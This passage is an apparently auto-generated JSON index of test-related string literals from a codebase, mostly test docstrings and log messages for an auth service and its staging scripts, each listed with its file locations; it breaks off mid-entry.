    "Test auth service database connection during tests.\n\nThis test verifies that the auth service properly uses SQLite during pytest execution\nand doesn't incorrectly try to connect to PostgreSQL.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Test Infrastructure Reliability\n- Value Impact: Ensures auth tests run correctly in isolated environments\n- Strategic Impact: Enables reliable CI/CD and development workflows": {
      "value": "Test auth service database connection during tests.\n\nThis test verifies that the auth service properly uses SQLite during pytest execution\nand doesn't incorrectly try to connect to PostgreSQL.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Test Infrastructure Reliability\n- Value Impact: Ensures auth tests run correctly in isolated environments\n- Strategic Impact: Enables reliable CI/CD and development workflows",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_connection.py:1"
      ]
    },
    "Test auth service database session management and DatabaseURLBuilder integration.": {
      "value": "Test auth service database session management and DatabaseURLBuilder integration.",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:1"
      ]
    },
    "Test auth service health endpoint": {
      "value": "Test auth service health endpoint",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:28"
      ]
    },
    "Test authentication flow.": {
      "value": "Test authentication flow.",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:217"
      ]
    },
    "Test automatic session expiry via validate_session": {
      "value": "Test automatic session expiry via validate_session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:124"
      ]
    },
    "Test backend auth client integration": {
      "value": "Test backend auth client integration",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:62"
      ]
    },
    "Test backend service database connection": {
      "value": "Test backend service database connection",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:23"
      ]
    },
    "Test basic WebSocket connection to the backend.": {
      "value": "Test basic WebSocket connection to the backend.",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:12"
      ]
    },
    "Test basic service startup orchestration.": {
      "value": "Test basic service startup orchestration.",
      "category": "test_literals",
      "locations": [
        "scripts/test_service_startup.py:20"
      ]
    },
    "Test behavior when Redis connection pool is exhausted": {
      "value": "Test behavior when Redis connection pool is exhausted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:191"
      ]
    },
    "Test behavior when Redis is explicitly disabled": {
      "value": "Test behavior when Redis is explicitly disabled",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:246"
      ]
    },
    "Test case": {
      "value": "Test case",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:84"
      ]
    },
    "Test category to run": {
      "value": "Test category to run",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:370"
      ]
    },
    "Test checking specific workflow run ID": {
      "value": "Test checking specific workflow run ID",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:154"
      ]
    },
    "Test classes:": {
      "value": "Test classes:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:36"
      ]
    },
    "Test cleanup job handles database errors gracefully": {
      "value": "Test cleanup job handles database errors gracefully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:231"
      ]
    },
    "Test cleanup job handles large number of sessions": {
      "value": "Test cleanup job handles large number of sessions",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:208"
      ]
    },
    "Test cleanup of expired sessions": {
      "value": "Test cleanup of expired sessions",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:102"
      ]
    },
    "Test cleanup of inactive sessions": {
      "value": "Test cleanup of inactive sessions",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:127"
      ]
    },
    "Test cleanup preserves most recent sessions": {
      "value": "Test cleanup preserves most recent sessions",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:177"
      ]
    },
    "Test complete OAuth flow across all three services in staging": {
      "value": "Test complete OAuth flow across all three services in staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1402"
      ]
    },
    "Test complete connection lifecycle with events.": {
      "value": "Test complete connection lifecycle with events.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:227"
      ]
    },
    "Test complete end-to-end coordination workflow.": {
      "value": "Test complete end-to-end coordination workflow.",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:278"
      ]
    },
    "Test complete token flow from creation to validation.": {
      "value": "Test complete token flow from creation to validation.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:327"
      ]
    },
    "Test completed successfully!": {
      "value": "Test completed successfully!",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:67"
      ]
    },
    "Test comprehensive attack scenario": {
      "value": "Test comprehensive attack scenario",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:682"
      ]
    },
    "Test comprehensive audit logging": {
      "value": "Test comprehensive audit logging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:533"
      ]
    },
    "Test concurrent operations during Redis failover": {
      "value": "Test concurrent operations during Redis failover",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:290"
      ]
    },
    "Test config file not found:": {
      "value": "Test config file not found:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:218"
      ]
    },
    "Test configuration loading for staging environment.": {
      "value": "Test configuration loading for staging environment.",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:2"
      ]
    },
    "Test configuration loading with detailed logging for debugging staging issues.": {
      "value": "Test configuration loading with detailed logging for debugging staging issues.",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:2"
      ]
    },
    "Test connection event handlers are properly configured.": {
      "value": "Test connection event handlers are properly configured.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:139"
      ]
    },
    "Test connection retry with exponential backoff.": {
      "value": "Test connection retry with exponential backoff.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:235"
      ]
    },
    "Test connection using AuthConfig generated URL.": {
      "value": "Test connection using AuthConfig generated URL.",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:188"
      ]
    },
    "Test coverage calculation module.\n\nCalculates test coverage metrics and trends.\nFollows 450-line limit with 25-line function limit.": {
      "value": "Test coverage calculation module.\n\nCalculates test coverage metrics and trends.\nFollows 450-line limit with 25-line function limit.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:1"
      ]
    },
    "Test coverage metrics calculator.\n\nCalculates test coverage and related metrics.\nFollows 450-line limit with 25-line function limit.": {
      "value": "Test coverage metrics calculator.\n\nCalculates test coverage and related metrics.\nFollows 450-line limit with 25-line function limit.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:1"
      ]
    },
    "Test crashed:": {
      "value": "Test crashed:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:187",
        "auth_service/test_staging_db_connection.py:336",
        "auth_service/test_url_construction.py:253"
      ]
    },
    "Test database connection with individual secrets.": {
      "value": "Test database connection with individual secrets.",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:30"
      ]
    },
    "Test database engine setup complete:": {
      "value": "Test database engine setup complete:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:48"
      ]
    },
    "Test database initialization and table creation": {
      "value": "Test database initialization and table creation",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:16"
      ]
    },
    "Test database migrations against staging database.": {
      "value": "Test database migrations against staging database.",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:1"
      ]
    },
    "Test direct asyncpg connection using staging credentials.": {
      "value": "Test direct asyncpg connection using staging credentials.",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:49"
      ]
    },
    "Test discovery file not found:": {
      "value": "Test discovery file not found:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:317"
      ]
    },
    "Test distribution by top-level directory:": {
      "value": "Test distribution by top-level directory:",
      "category": "test_literals",
      "locations": [
        "scripts/test_exclusion_check.py:55"
      ]
    },
    "Test email format validation": {
      "value": "Test email format validation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:396"
      ]
    },
    "Test enforcement of maximum sessions per user": {
      "value": "Test enforcement of maximum sessions per user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:147"
      ]
    },
    "Test execution error:": {
      "value": "Test execution error:",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:62"
      ]
    },
    "Test execution failed:": {
      "value": "Test execution failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:449"
      ]
    },
    "Test execution interrupted by user": {
      "value": "Test execution interrupted by user",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:446"
      ]
    },
    "Test execution timed out": {
      "value": "Test execution timed out",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:60"
      ]
    },
    "Test failed": {
      "value": "Test failed",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:131"
      ]
    },
    "Test failed login attempts are logged": {
      "value": "Test failed login attempts are logged",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:477"
      ]
    },
    "Test failed:": {
      "value": "Test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:245"
      ]
    },
    "Test file": {
      "value": "Test file",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:742"
      ]
    },
    "Test file and function limits compliance checker.\nEnforces SPEC/testing.xml rules: test files MUST follow same 450-line limit as production code,\ntest functions MUST follow same 25-line limit as production code.": {
      "value": "Test file and function limits compliance checker.\nEnforces SPEC/testing.xml rules: test files MUST follow same 450-line limit as production code,\ntest functions MUST follow same 25-line limit as production code.",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:2"
      ]
    },
    "Test file exceeds": {
      "value": "Test file exceeds",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:112",
        "scripts/compliance/test_size_validator.py:193"
      ]
    },
    "Test file to analyze": {
      "value": "Test file to analyze",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:673",
        "scripts/compliance/test_refactor_helper.py:678"
      ]
    },
    "Test file to validate": {
      "value": "Test file to validate",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:684"
      ]
    },
    "Test files:": {
      "value": "Test files:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:426"
      ]
    },
    "Test function '": {
      "value": "Test function '",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:329",
        "scripts/compliance/real_test_requirements_enforcer.py:448",
        "scripts/compliance/test_limits_checker.py:156",
        "scripts/compliance/test_size_validator.py:232"
      ]
    },
    "Test functions:": {
      "value": "Test functions:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:35",
        "scripts/compliance/demo_test_size_enforcement.py:156"
      ]
    },
    "Test graceful degradation when Redis is unavailable": {
      "value": "Test graceful degradation when Redis is unavailable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:82"
      ]
    },
    "Test graceful degradation with optional service failures.": {
      "value": "Test graceful degradation with optional service failures.",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:230"
      ]
    },
    "Test handling multiple sessions for same user": {
      "value": "Test handling multiple sessions for same user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:199"
      ]
    },
    "Test handling of Redis connection timeouts": {
      "value": "Test handling of Redis connection timeouts",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:171"
      ]
    },
    "Test health endpoints for all services": {
      "value": "Test health endpoints for all services",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:82"
      ]
    },
    "Test if Cloud SQL connector can be imported": {
      "value": "Test if Cloud SQL connector can be imported",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:109"
      ]
    },
    "Test interrupted by user": {
      "value": "Test interrupted by user",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:333",
        "scripts/test_websocket_dev_mode.py:344"
      ]
    },
    "Test level to run": {
      "value": "Test level to run",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:77"
      ]
    },
    "Test logout of all user sessions": {
      "value": "Test logout of all user sessions",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:264"
      ]
    },
    "Test main API endpoints": {
      "value": "Test main API endpoints",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:102"
      ]
    },
    "Test message for validation": {
      "value": "Test message for validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:281",
        "scripts/test_example_message_flow.py:296"
      ]
    },
    "Test module split from original file": {
      "value": "Test module split from original file",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:518"
      ]
    },
    "Test passed": {
      "value": "Test passed",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:182",
        "scripts/test_error_monitor_logic.py:206",
        "scripts/test_error_monitor_logic.py:225"
      ]
    },
    "Test password length validation": {
      "value": "Test password length validation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:420"
      ]
    },
    "Test pool monitoring and warning patterns.": {
      "value": "Test pool monitoring and warning patterns.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:156"
      ]
    },
    "Test port allocation prevents conflicts.": {
      "value": "Test port allocation prevents conflicts.",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:157"
      ]
    },
    "Test prevention of HTTP method override attacks": {
      "value": "Test prevention of HTTP method override attacks",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:377"
      ]
    },
    "Test prevention of token injection attacks": {
      "value": "Test prevention of token injection attacks",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:606"
      ]
    },
    "Test processes running:": {
      "value": "Test processes running:",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:164"
      ]
    },
    "Test proper resource cleanup.": {
      "value": "Test proper resource cleanup.",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:350"
      ]
    },
    "Test protection against concurrent async attempts": {
      "value": "Test protection against concurrent async attempts",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:292"
      ]
    },
    "Test protection against large payload attacks": {
      "value": "Test protection against large payload attacks",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:456"
      ]
    },
    "Test rate limiting on login attempts": {
      "value": "Test rate limiting on login attempts",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:644"
      ]
    },
    "Test rate limiting on token validation": {
      "value": "Test rate limiting on token validation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:667"
      ]
    },
    "Test receiving model response via WebSocket.": {
      "value": "Test receiving model response via WebSocket.",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:371"
      ]
    },
    "Test refactoring helper": {
      "value": "Test refactoring helper",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:659"
      ]
    },
    "Test refactoring helper for splitting large test files.\n\nThis helper analyzes large test files and suggests intelligent splits based on:\n- Test categories (unit, integration, e2e)\n- Functionality being tested\n- Test classes and groupings\n- Dependencies between tests\n\nFeatures:\n- Analyzes large test files and suggests splits\n- Groups related tests for extraction\n- Maintains test dependencies when splitting\n- Generates new file names following conventions\n- Preserves imports and test utilities": {
      "value": "Test refactoring helper for splitting large test files.\n\nThis helper analyzes large test files and suggests intelligent splits based on:\n- Test categories (unit, integration, e2e)\n- Functionality being tested\n- Test classes and groupings\n- Dependencies between tests\n\nFeatures:\n- Analyzes large test files and suggests splits\n- Groups related tests for extraction\n- Maintains test dependencies when splitting\n- Generates new file names following conventions\n- Preserves imports and test utilities",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:2"
      ]
    },
    "Test refresh attempt on expired session": {
      "value": "Test refresh attempt on expired session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:178"
      ]
    },
    "Test refreshing active session before expiry": {
      "value": "Test refreshing active session before expiry",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:164"
      ]
    },
    "Test report saved to: workflow_verification_test_report.md": {
      "value": "Test report saved to: workflow_verification_test_report.md",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:218"
      ]
    },
    "Test run timed out": {
      "value": "Test run timed out",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:43"
      ]
    },
    "Test runner to validate service coordination fixes.\n\nThis script runs the coordination system tests to ensure all issues\nidentified in test_critical_cold_start_initialization.py are resolved.": {
      "value": "Test runner to validate service coordination fixes.\n\nThis script runs the coordination system tests to ensure all issues\nidentified in test_critical_cold_start_initialization.py are resolved.",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:1"
      ]
    },
    "Test script for staging error monitor logic validation.\n\nThis script tests the error threshold and decision logic without requiring GCP access.": {
      "value": "Test script for staging error monitor logic validation.\n\nThis script tests the error threshold and decision logic without requiring GCP access.",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:1"
      ]
    },
    "Test script for verify_workflow_status.py\n\nDemonstrates usage patterns and validates the script functionality.": {
      "value": "Test script for verify_workflow_status.py\n\nDemonstrates usage patterns and validates the script functionality.",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:2"
      ]
    },
    "Test script to debug Auth service database connection with staging credentials.\n\nThis script tests the database connection locally using the exact same configuration\nas the Auth service would use in staging environment.": {
      "value": "Test script to debug Auth service database connection with staging credentials.\n\nThis script tests the database connection locally using the exact same configuration\nas the Auth service would use in staging environment.",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:1"
      ]
    },
    "Test script to verify environment detection is working correctly.\nRun this to ensure all environment detection logic defaults to staging, not production.": {
      "value": "Test script to verify environment detection is working correctly.\nRun this to ensure all environment detection logic defaults to staging, not production.",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:1"
      ]
    },
    "Test security headers are set properly": {
      "value": "Test security headers are set properly",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:331"
      ]
    },
    "Test sending a chat message.": {
      "value": "Test sending a chat message.",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:310"
      ]
    },
    "Test separation between readiness and health checks.": {
      "value": "Test separation between readiness and health checks.",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:122"
      ]
    },
    "Test service discovery handles timing issues.": {
      "value": "Test service discovery handles timing issues.",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:186"
      ]
    },
    "Test session created successfully!": {
      "value": "Test session created successfully!",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:63"
      ]
    },
    "Test session data is isolated per session": {
      "value": "Test session data is isolated per session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:363"
      ]
    },
    "Test sessions are isolated between users": {
      "value": "Test sessions are isolated between users",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:223"
      ]
    },
    "Test size limits validator": {
      "value": "Test size limits validator",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:507"
      ]
    },
    "Test splitting strategy (default: hybrid)": {
      "value": "Test splitting strategy (default: hybrid)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:843"
      ]
    },
    "Test staging environment": {
      "value": "Test staging environment",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:206"
      ]
    },
    "Test staging startup sequence": {
      "value": "Test staging startup sequence",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:286"
      ]
    },
    "Test successful Redis connection when Redis is available": {
      "value": "Test successful Redis connection when Redis is available",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:46"
      ]
    },
    "Test suite for verify_workflow_status.py\n\nTests various scenarios and documents the verification results.": {
      "value": "Test suite for verify_workflow_status.py\n\nTests various scenarios and documents the verification results.",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:2"
      ]
    },
    "Test table output format": {
      "value": "Test table output format",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:139"
      ]
    },
    "Test that Cloud SQL Unix socket URLs are handled correctly": {
      "value": "Test that Cloud SQL Unix socket URLs are handled correctly",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:15"
      ]
    },
    "Test that Heroku-style postgres:// URLs are handled correctly": {
      "value": "Test that Heroku-style postgres:// URLs are handled correctly",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:98"
      ]
    },
    "Test that PostgreSQL URLs with sslmode are converted correctly": {
      "value": "Test that PostgreSQL URLs with sslmode are converted correctly",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:50"
      ]
    },
    "Test that auth database connection fails without SSL configuration.": {
      "value": "Test that auth database connection fails without SSL configuration.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_database_connection.py:22"
      ]
    },
    "Test that auth routes don't attempt to sync to a separate database": {
      "value": "Test that auth routes don't attempt to sync to a separate database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:76"
      ]
    },
    "Test that auth service can create tables in SQLite.": {
      "value": "Test that auth service can create tables in SQLite.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_connection.py:48"
      ]
    },
    "Test that auth service initializes only one database connection": {
      "value": "Test that auth service initializes only one database connection",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:28"
      ]
    },
    "Test that auth service uses DATABASE_URL from environment": {
      "value": "Test that auth service uses DATABASE_URL from environment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:96"
      ]
    },
    "Test that auth service uses SQLite for database connections during tests.": {
      "value": "Test that auth service uses SQLite for database connections during tests.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_connection.py:26"
      ]
    },
    "Test that connection.py calls the correct database URL method.": {
      "value": "Test that connection.py calls the correct database URL method.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:74"
      ]
    },
    "Test that dependency resolution prevents early startup.": {
      "value": "Test that dependency resolution prevents early startup.",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:81"
      ]
    },
    "Test that main_db_sync module does not exist (removed duplicate)": {
      "value": "Test that main_db_sync module does not exist (removed duplicate)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:17"
      ]
    },
    "Test that memory store provides proper isolation between instances": {
      "value": "Test that memory store provides proper isolation between instances",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:219"
      ]
    },
    "Test that regular PostgreSQL URLs are handled correctly": {
      "value": "Test that regular PostgreSQL URLs are handled correctly",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:75"
      ]
    },
    "Test that user creation maintains database integrity.": {
      "value": "Test that user creation maintains database integrity.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_database_connection.py:34"
      ]
    },
    "Test the AgentInitializationManager.": {
      "value": "Test the AgentInitializationManager.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:19"
      ]
    },
    "Test the enhanced agent registry.": {
      "value": "Test the enhanced agent registry.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:131"
      ]
    },
    "Test the modular DataSubAgent.": {
      "value": "Test the modular DataSubAgent.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:87"
      ]
    },
    "Test timed out": {
      "value": "Test timed out",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:67"
      ]
    },
    "Test to ensure auth service uses only ONE database connection\nPrevents regression of duplicate database connection issue": {
      "value": "Test to ensure auth service uses only ONE database connection\nPrevents regression of duplicate database connection issue",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:1"
      ]
    },
    "Test token generation with mock user": {
      "value": "Test token generation with mock user",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:236"
      ]
    },
    "Test token validation": {
      "value": "Test token validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:296"
      ]
    },
    "Test token validation between services": {
      "value": "Test token validation between services",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:82"
      ]
    },
    "Test utilities and helper functions": {
      "value": "Test utilities and helper functions",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:547"
      ]
    },
    "Test validation of expired session": {
      "value": "Test validation of expired session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:96"
      ]
    },
    "Test validation of valid session": {
      "value": "Test validation of valid session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:77"
      ]
    },
    "Test with no assertions": {
      "value": "Test with no assertions",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:277"
      ]
    },
    "Test1!": {
      "value": "Test1!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:118"
      ]
    },
    "TestClient/1.0": {
      "value": "TestClient/1.0",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:559"
      ]
    },
    "TestPassword123!": {
      "value": "TestPassword123!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:189",
        "auth_service/tests/test_password_hashing_basics.py:43",
        "auth_service/tests/test_password_hashing_basics.py:98",
        "auth_service/tests/utils/test_helpers.py:40",
        "auth_service/tests/utils/test_helpers.py:101"
      ]
    },
    "Tested shell command pattern:": {
      "value": "Tested shell command pattern:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:121"
      ]
    },
    "Testing AgentInitializationManager...": {
      "value": "Testing AgentInitializationManager...",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:20"
      ]
    },
    "Testing OAuth config:": {
      "value": "Testing OAuth config:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:205"
      ]
    },
    "Testing URL:": {
      "value": "Testing URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:196"
      ]
    },
    "Testing WebSocket connection...": {
      "value": "Testing WebSocket connection...",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:180"
      ]
    },
    "Testing against:": {
      "value": "Testing against:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:43"
      ]
    },
    "Testing all modules in netra_backend.app...": {
      "value": "Testing all modules in netra_backend.app...",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:70"
      ]
    },
    "Testing complete coordination workflow": {
      "value": "Testing complete coordination workflow",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:279"
      ]
    },
    "Testing configuration loading...": {
      "value": "Testing configuration loading...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:107"
      ]
    },
    "Testing critical error deployment scenario...": {
      "value": "Testing critical error deployment scenario...",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:187"
      ]
    },
    "Testing dependency resolution fixes": {
      "value": "Testing dependency resolution fixes",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:82"
      ]
    },
    "Testing dependency resolution...": {
      "value": "Testing dependency resolution...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:78"
      ]
    },
    "Testing enhanced agent registry...": {
      "value": "Testing enhanced agent registry...",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:132"
      ]
    },
    "Testing error categorization...": {
      "value": "Testing error categorization...",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:211"
      ]
    },
    "Testing graceful degradation": {
      "value": "Testing graceful degradation",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:231"
      ]
    },
    "Testing handler initialization...": {
      "value": "Testing handler initialization...",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:190"
      ]
    },
    "Testing health endpoints...": {
      "value": "Testing health endpoints...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:176"
      ]
    },
    "Testing help command...": {
      "value": "Testing help command...",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:30"
      ]
    },
    "Testing initialization...": {
      "value": "Testing initialization...",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:391"
      ]
    },
    "Testing message validation...": {
      "value": "Testing message validation...",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:196",
        "scripts/test_example_message_flow.py:397"
      ]
    },
    "Testing missing parameters...": {
